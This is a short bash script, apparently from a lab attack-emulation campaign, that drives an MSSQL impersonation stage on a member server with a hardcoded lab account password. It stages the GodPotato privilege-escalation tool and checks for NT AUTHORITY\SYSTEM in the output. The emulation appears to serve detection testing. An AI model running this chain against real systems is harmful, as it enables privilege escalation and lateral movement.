#!/usr/bin/env bash
# T043 — MSSQL impersonation from ws01
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T043-IMPERSON-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
MBR01="${MBR01:-192.168.77.22}"
echo "=== T043 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_lpe_binaries
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t043-impersonate.ps1 child.cadre.local \
  "-Server ${MBR01} -ServerFqdn mbr01.child.cadre.local -Username 'child.cadre.local\\analyst_t1' -Password 'T13r_An@lyst!' -ToolSource 'C:\\Tools\\ADTools' -GpPath 'C:\\Windows\\Temp\\cadre-tools\\GodPotato.exe'")"
printf '%s\n' "${OUT}"
campaign_require_ok T043 "${OUT}" 'T043_OK|nt authority\\system'

cadre_export "${CASE_ID}" T043 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
